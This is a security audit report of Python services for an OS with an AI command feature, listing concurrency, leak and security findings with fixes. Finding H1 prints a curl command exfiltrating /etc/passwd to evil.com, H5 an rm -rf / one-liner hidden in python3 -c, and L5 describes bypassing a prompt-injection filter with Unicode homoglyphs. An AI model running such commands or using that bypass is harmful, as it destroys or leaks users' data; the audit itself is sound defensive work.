# Axon OS Python Services — Security & Code Quality Audit

**Audit Date:** 2026-07-13
**Scope:** All `.py` files under `services/` (shared modules + 6 service directories)
**Files Audited:** 32 Python files across 10 directories (services/ + plugins/)

## Fixes Applied (2026-07-13)

| # | Fix | Audit Item | Commit |
|---|-----|-----------|--------|
| 1 | Thread-safe `_active_streams` dict with Lock | C1 | bccd17d |
| 2 | `search_messages()` fix `_close_connection` crash | C2 | f47dcf8 |
| 3 | Module-level `logger` in context_service | C3 | f47dcf8 |
| 4 | Subprocess timeouts in hardware_profiler (10s) | H8 | f4009fb |
| 5 | Rate limiting on Brain.Generate/Chat, Context, Search D-Bus methods | H-level | 7909e16, abb4010 |
| 6 | Systemd hardening (NoNewPrivileges, PrivateTmp, ProtectSystem, etc.) | Security | b2a0b58 |
| 7 | Docker: healthcheck pgrep, Dockerfile Python version match | Docker | daba700, ceebfb0 |
| 8 | Docker-compose healthcheck Python 3.12 | Docker | daba700 |
| 9 | TTLCache LRU eviction when all entries valid | H-level | f97bb1a |
| 10 | TOCTOU race in ollama setup removed | Security | e00d1ae |
| 11 | HTTP→HTTPS APT mirrors | Security | e00d1ae |
| 12 | ConversationStore deadlock (Lock→RLock) | M2 | 1523687 |
| 13 | ClipboardStore connection pooling + deadlock fix | M2 | 1523687 |
| 14 | boot_watchdog testability refactored | Testability | 6e9056e |
| 15 | D-Bus signal marshaled to main thread (PullProgress) | M7 | 040c25d |
| 16 | rate_limited decorator reimport eliminated | M8 | 040c25d |
| 17 | DB connection pools closed on shutdown (brain, context) | Adjacent | 47c6134 |
| 18 | Recorder subprocess killed on shutdown (advanced_voice) | Adjacent | d276d2e |
| 19 | ServiceBase._cleanup() lifecycle hook added | Fact 4 | a020faa |
| 20 | Dead code removed (_sanitize_command, unused imports) | Fact 1 | 0b97afc |
| 21 | _log_helper migration (service_base, brain, ai_router, telemetry) | Fact 2 | 12b1bac, 7eb019e |
| 22 | 4 pre-existing test failures resolved | Tests | f47dcf8 |
| 23 | Escape single quotes in to_gvariant | M9 | 637d86f |
| 24 | Extend FileIndexer._lock to full DB transactions | C4 | f06c726 |
| 25 | Add start_new_session=True to safe_exec Popen | H3 | f06c726 |
| 26 | Filter sensitive paths from /proc scanning | H4 | f06c726 |
| 27 | Class-level _write_lock for JSONL writes | H6 | f06c726 |
| 28 | Periodic rebuild of _watch_loop known dict | H7 | f06c726 |
| 29 | Unlink temp file on early return (voice) | M1 | f06c726 |
| 30 | chmod 0o600 on temp audio files | M3 | f06c726 |
| 31 | Store stdout ref to prevent GC (clipboard) | M4 | f06c726 |
| 32 | Prune terminal cache mtime dict | M5 | f06c726 |
| 33 | Guard sys.path.insert calls (11 files) | M6 | f06c726 |
| 34 | Reject empty-segment bus names | L3 | f06c726 |
| 35 | Rate-limit SearchCatalog method | L4 | f06c726 |
| 36 | Log exceptions in audit rule matching | L10 | f06c726 |
| 37 | f-string logger to %s formatting | L2 | 2de1fe0 |
| 38 | Unicode NFKD normalization in injection filter | L5 | 2de1fe0 |
| 39 | Lazy i18n _() to avoid import side effect | L7 | 2de1fe0 |
| 40 | Thread-safe sample plugin counter | L8 | 2de1fe0 |
| 41 | D-Bus Generate arg mismatch fallback | L12 | 2de1fe0 |

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH     | 8 |
| MEDIUM   | 9 |
| LOW      | 12 |
| **Total** | **33** |

---

## CRITICAL

### C1. Race condition on `_active_streams` dict (brain_service.py)
- **File:** `services/axon-brain/brain_service.py`
- **Lines:** 418, 435, 687, 720, 743, 790
- **Description:** `_active_streams: dict[str, threading.Event]` is written from D-Bus thread (`Generate`, `SendMessage`), read from D-Bus thread (`CancelStream`), and entries are deleted from worker threads (`_do_generate_stream`, `_do_chat_stream`). Concurrent dict insert + delete from different threads can corrupt CPython internal dict state during resize operations.
- **Fix:** Protect with `threading.Lock()`:
  ```python
  # In _setup():
  self._streams_lock = threading.Lock()

  # In Generate/SendMessage:
  with self._streams_lock:
      self._active_streams[tx_id] = cancel_flag

  # In CancelStream:
  with self._streams_lock:
      cancel_flag = self._active_streams.get(transaction_id)

  # In finally blocks:
  with self._streams_lock:
      self._active_streams.pop(tx_id, None)
  ```

### C2. Undefined method `_close_connection` crashes `search_messages` (conversation_store.py)
- **File:** `services/axon-brain/conversation_store.py`
- **Line:** 178
- **Description:** `search_messages()` calls `self._close_connection(conn)` in its `finally` block, but this method does not exist on `ConversationStore`. Every invocation raises `AttributeError`, making conversation search completely broken.
- **Fix:** Replace `self._close_connection(conn)` with `pass` (the per-thread connection should persist) or add the missing method:
  ```python
  def _close_connection(self, conn):
      # No-op: connections are managed per-thread via threading.local()
      pass
  ```

### C3. Undefined `logger` variable crashes all ContextService methods
- **File:** `services/axon-context/context_service.py`
- **Lines:** 86, 258, 261, 264, 268, 307, 330, 354, 454, 464
- **Description:** `logger` is never defined at module scope. It only appears in the `if __name__ == "__main__"` block (line 484), which doesn't run when imported. Every method referencing `logger.debug()` or `logger.warning()` raises `NameError`, breaking clipboard watching, config loading, open-files detection, terminal history, and stderr reading.
- **Fix:** Add at module level (after line 33):
  ```python
  logger = configure_app_logger("axon-context")
  ```

### C4. Unprotected SQLite connection in FileIndexer
- **File:** `services/axon-context/file_indexer.py`
- **Lines:** 34-38, 90-153
- **Description:** `self.conn` is a single `sqlite3.connect()` with `check_same_thread=False`, shared across `index_file()`, `remove_deleted_files()`, and `scan_and_index()` with no locking. Concurrent access from the `run_loop()` thread and external callers corrupts the database or raises `sqlite3.OperationalError`.
- **Fix:** Wrap all `self.conn` operations with `threading.Lock`, or use `check_same_thread=True` with per-thread connections.

---

## HIGH

### H1. Command execution from untrusted AI output via voice
- **File:** `services/axon-voice/voice_service.py`
- **Lines:** 236-248
- **Description:** When the Brain classifies spoken text as `run_command`, the raw AI-generated command is passed directly to `safe_exec(payload)` without applying `_sanitize_command()` first. While `safe_exec` has a whitelist, it allows `curl` and `wget` with arbitrary arguments — e.g. `curl evil.com --data @/etc/passwd` would exfiltrate credentials. The voice input is user speech vulnerable to prompt injection via spoken words.
- **Fix:** Apply `_sanitize_command()` from `brain_service.py` before `safe_exec()`. Additionally, restrict arguments for network commands (block `--data`, `--upload-file`, `-d`, `-T` flags for curl/wget).

### H2. Arbitrary code execution via plugin loading
- **File:** `services/plugin_registry.py`
- **Lines:** 271-276
- **Description:** `spec.loader.exec_module(module)` runs arbitrary Python from plugin entry points. While path traversal is checked, there is no sandboxing, signature verification, or privilege separation. A malicious plugin gets full Python execution within the D-Bus service process, with access to all D-Bus interfaces.
- **Fix:** Run plugins in isolated processes, add TOML manifest signature verification, or require user confirmation before loading third-party plugins.

### H3. Popen objects never closed — zombie processes
- **File:** `services/service_utils.py`
- **Line:** 106
- **Description:** `safe_exec()` returns a `subprocess.Popen` object. Callers (`voice_service.py:247`) discard the return without calling `.wait()` or `.communicate()`, creating zombie processes that accumulate and can hit the system process limit.
- **Fix:** Use `subprocess.Popen(..., start_new_session=True)` so the OS reaps children automatically, or require callers to manage the returned process.

### H4. Process file descriptors exposed via `/proc` scanning
- **File:** `services/axon-context/context_service.py`
- **Lines:** 337-384
- **Description:** `_get_open_files()` reads `/proc/{pid}/fd` symlinks for editor processes and returns all open file paths via D-Bus. This exposes sensitive paths (SSH keys, `.env` files, credential stores) that happen to be open in an editor. These paths then flow into LLM context strings.
- **Fix:** Filter returned paths against sensitive patterns before including in context:
  ```python
  SENSITIVE_PATTERNS = {'.ssh', '.gnupg', '.env', 'credentials', 'password', 'key'}
  if not any(p in target.lower() for p in SENSITIVE_PATTERNS):
      unique_paths.append(target)
  ```

### H5. Overly broad AI command allowlist
- **File:** `services/axon-brain/brain_service.py`
- **Lines:** 73-81
- **Description:** `_ALLOWED_CMD_PREFIXES` includes `python3`, `node`, `pip3`, `systemctl`, `curl`, `wget`. A command like `python3 -c "import os; os.system('rm -rf /')"` passes `_sanitize_command()` because `python3` is whitelisted and `_DANGEROUS_CMD_PATTERNS` won't match (the dangerous payload is inside a Python string).
- **Fix:** Remove code interpreters (`python3`, `node`) from `_ALLOWED_CMD_PREFIXES`, or add patterns:
  ```python
  re.compile(r"\bpython3?\s+-c\b"),  # python -c <code>
  re.compile(r"\bnode\s+-e\b"),      # node -e <code>
  re.compile(r"\bpip3?\s+install\b"), # pip install
  ```

### H6. JSONL file corruption from concurrent writes
- **File:** `services/telemetry.py`
- **Lines:** 224-239
- **Description:** `_append_jsonl()` is a `@staticmethod` with no lock. Multiple threads calling `track_event()` simultaneously can produce corrupted JSONL (interleaved partial lines).
- **Fix:** Add a class-level lock:
  ```python
  _write_lock = threading.Lock()

  @staticmethod
  def _append_jsonl(path, entry):
      with Telemetry._write_lock:
          # ... existing logic
  ```

### H7. Unbounded `_watch_loop` dict growth
- **File:** `services/axon-search/search_service.py`
- **Lines:** 233-258
- **Description:** The `known: dict[str, float | None]` dict in `_watch_loop()` grows with every discovered file and is never pruned. On systems with millions of files, this consumes unbounded memory over the service lifetime.
- **Fix:** Periodically re-initialize `known` or cap its size. A simple approach: rebuild `known` from scratch every N cycles.

### H8. Subprocess calls without timeout in hardware profiler
- **File:** `services/axon-brain/hardware_profiler.py`
- **Lines:** 33-38, 56-58, 75
- **Description:** `subprocess.run(["nvidia-smi", ...])` and `subprocess.check_output(["lspci"])` have no `timeout`. If a system utility hangs (GPU driver deadlock), the calling thread blocks forever during service startup.
- **Fix:** Add `timeout=10` to all subprocess calls.

---

## MEDIUM

### M1. Temp file leaked on early return (voice_service.py)
- **File:** `services/axon-voice/voice_service.py`
- **Lines:** 145-154
- **Description:** `tempfile.mkstemp()` creates a file (line 145), but if `_recorder_command()` returns `None` (line 148), the function returns without deleting it. The path is never stored in `self._wav_path`, so it's orphaned.
- **Fix:** Add `os.unlink(wav_path)` before the error return.

### M2. New SQLite connection per operation (clipboard_store.py)
- **File:** `services/axon-context/clipboard_store.py`
- **Lines:** 28-32
- **Description:** `_get_connection()` creates a new `sqlite3.connect()` for every `add()`, `get_recent()`, `search()` call, then closes it. This defeats WAL benefits and creates connection churn. Under rapid clipboard activity, this causes `database is locked` errors.
- **Fix:** Use `threading.local()` for per-thread persistent connections, like `ConversationStore`.

### M3. Temp file created without restrictive permissions
- **File:** `services/axon-voice/voice_service.py`
- **Line:** 145; `advanced_voice_service.py:305`; `voice_service.py:412`
- **Description:** `tempfile.mkstemp()` for audio recordings relies on umask for permissions. On permissive systems, audio files could be world-readable.
- **Fix:** Add `os.chmod(wav_path, 0o600)` after creation.

### M4. File handle reference not retained for GLib IO watch
- **File:** `services/axon-context/context_service.py`
- **Lines:** 246-257
- **Description:** `GLib.io_add_watch(self._clipboard_watcher.stdout.fileno(), ...)` uses the raw fd, but the Python file object `self._clipboard_watcher.stdout` may be garbage collected, closing the fd prematurely.
- **Fix:** Store `self._stdout_ref = self._clipboard_watcher.stdout` on the instance.

### M5. Terminal cache dict never pruned
- **File:** `services/axon-context/context_service.py`
- **Lines:** 417-425
- **Description:** `self._terminal_cache_mtime` grows with each new history file path discovered. Minor memory leak over long service lifetimes.
- **Fix:** Keep only the most recent entry or limit to 5 entries.

### M6. Duplicate `sys.path.insert` calls across files
- **Files:** `brain_service.py:45-46`, `model_marketplace.py:22-25`, `context_service.py:18,36`, `voice_service.py:30,36`, `search_service.py:25,30`, `gui_agent_service.py:25,28`
- **Description:** Multiple `sys.path.insert(0, ...)` calls accumulate on reimport, growing `sys.path` with redundant entries and potentially causing import shadowing.
- **Fix:** Guard with `if path not in sys.path:` or use proper package structure.

### M7. D-Bus signal emitted from worker thread (model_marketplace.py)
- **File:** `services/axon-brain/model_marketplace.py`
- **Line:** 374
- **Description:** `self.PullProgress(model_name, status, progress)` is called from the `_do_pull` worker thread. D-Bus signals should be emitted from the GLib main thread for guaranteed safety.
- **Fix:** Use `GLib.idle_add(self.PullProgress, model_name, status, progress)`.

### M8. `rate_limited` decorator reimports on every call
- **File:** `services/service_utils.py`
- **Line:** 270
- **Description:** `from axon_logger import configure_app_logger` is inside the wrapper function, executed on every D-Bus method call.
- **Fix:** Move to module level or use a cached logger.

### M9. `to_gvariant` doesn't escape single quotes
- **File:** `services/axon-gui-agent/plan.py`
- **Line:** 123
- **Description:** `f"'{value!s}'"` doesn't escape embedded single quotes. A value like `it's` produces `'it's'`, breaking gsettings parsing.
- **Fix:** `value = str(value).replace("'", "\\'")` before wrapping in quotes.

---

## LOW

### L1. `import json` inside method body
- **File:** `services/axon-brain/brain_service.py`, line 127
- **Description:** `import json` inside `GetStatus()` executes on every D-Bus call. While cached, the lookup is unnecessary overhead.
- **Fix:** Move to module level.

### L2. f-strings in logger calls
- **File:** `services/axon-sandbox/sandbox_manager.py`, lines 181, 190, 199, 228, 234, 239, 251, 255
- **Description:** f-strings in log calls are evaluated even when the log level is disabled.
- **Fix:** Use `%s` formatting: `self.logger.info("message: %s", variable)`.

### L3. `_validate_bus_name` allows empty segments
- **File:** `services/plugin_deploy.py`, line 32
- **Description:** Bus names like `org.axonos..Bad` pass validation (no `".."` substring, regex matches). Creates confusing filesystem paths.
- **Fix:** Add: `not any(part == "" for part in bus_name.split("."))`.

### L4. `SearchCatalog` has no rate limiting
- **File:** `services/axon-brain/model_marketplace.py`, line 203
- **Description:** `SearchCatalog` lacks `@rate_limited`. A D-Bus caller could flood the method.
- **Fix:** Add `@rate_limited(rate=200, window_seconds=60)`.

### L5. Prompt injection filter bypass via Unicode
- **File:** `services/axon-brain/brain_service.py`, lines 66-71
- **Description:** `_INJECTION_PATTERNS` only matches ASCII. Unicode homoglyphs (e.g., Cyrillic "і" for Latin "i") bypass the regex.
- **Fix:** Add `unicodedata.normalize("NFKD", ...)` before regex matching.

### L6. `_http_post`/`_http_get` retry on any `OSError` may retry non-transient errors
- **File:** `services/axon-brain/brain_service.py`, lines 288-314
- **Description:** Catches `OSError` broadly, which includes non-transient errors like `FileNotFoundError` (bad URL) or `ConnectionRefusedError` (Ollama not running). Retrying these wastes time.
- **Fix:** Only retry on `urllib.error.URLError`, `TimeoutError`, and `ConnectionResetError`.

### L7. Module-scope side effect in i18n.py
- **File:** `services/i18n.py`
- **Line:** 62
- **Description:** `get_translator()` is called at module scope, triggering `gettext.translation()` on every import. This can be slow on first import and may produce warnings if locale files are missing.
- **Fix:** Make `_` lazy: `_ = None; def _(text): ...` or use `gettext.gettext` directly.

### L8. Sample plugin counter not thread-safe
- **File:** `services/plugins/sample-plugin/sample_service.py`
- **Line:** 26
- **Description:** `self._counter += 1` in `Hello()` is not atomic. Concurrent D-Bus calls can produce incorrect counts. Low priority (sample code), but sets a bad example.
- **Fix:** Use `threading.Lock()` or `atomic` counter.

### L9. `_log_helper.py` exists but no service uses it
- **File:** `services/_log_helper.py`
- **Description:** This module provides `resolve_logger()` which eliminates the repeated try/except ImportError boilerplate copied into every service file. However, no service file imports it — they all duplicate the fallback pattern. This is a maintenance opportunity, not a bug.
- **Fix:** Migrate services to use `from _log_helper import resolve_logger`.

### L10. Silent exception swallowing in threat rule matching
- **File:** `services/axon-sandbox/audit_v2.py`
- **Line:** 438
- **Description:** `except Exception: pass` in the rule-matching loop silently discards errors from any `ThreatRule.match_fn`. A buggy rule (e.g., unexpected input) would produce false negatives with no diagnostic trace.
- **Fix:** Log the exception: `except Exception as e: logging.getLogger(__name__).debug("Rule %s failed: %s", rule.name, e)`.

### L11. `sys.path.insert` without guard in shield.py
- **File:** `services/axon-sandbox/shield.py`
- **Line:** 25
- **Description:** Same `sys.path.insert` without duplicate guard as M6.

### L12. D-Bus method argument count mismatch risk (shield.py)
- **File:** `services/axon-sandbox/shield.py`
- **Line:** 60
- **Description:** `brain.Generate(prompt, "", "", False, timeout=AI_AUDIT_TIMEOUT)` passes 4 positional args. If the Brain D-Bus interface changes its `Generate` signature, this silently breaks. No interface version check is performed.
- **Fix:** Add a try/except around the D-Bus call with a clear error message on `TypeError`.

---

## Positive Observations

The codebase demonstrates several good engineering practices:

1. **Input validation:** Model names validated with regex, prompts length-checked, conversation IDs UUIDs.
2. **Atomic file writes:** Config/catalog saves use tmp-then-replace pattern for crash safety.
3. **Rate limiting:** Critical D-Bus methods use `@rate_limited` decorator.
4. **Command whitelisting:** `safe_exec` uses explicit allowlist with shell metacharacter blocking.
5. **Prompt injection defenses:** `_sanitize_context` strips injection patterns, wraps in `<untrusted_context>`, truncates to 500 chars.
6. **Cache bounds:** `TTLCache._MAX_ENTRIES = 10_000` prevents unbounded growth.
7. **Database permissions:** Conversation DB restricted to `0o600`.
8. **WAL mode:** All SQLite databases use WAL journal mode for concurrent reads.
9. **AI routing:** Context-aware model selection with proper thread-safe singleton.
10. **Shell audit:** Multi-layered (regex + AST + obfuscation detection) static analysis for untrusted scripts.
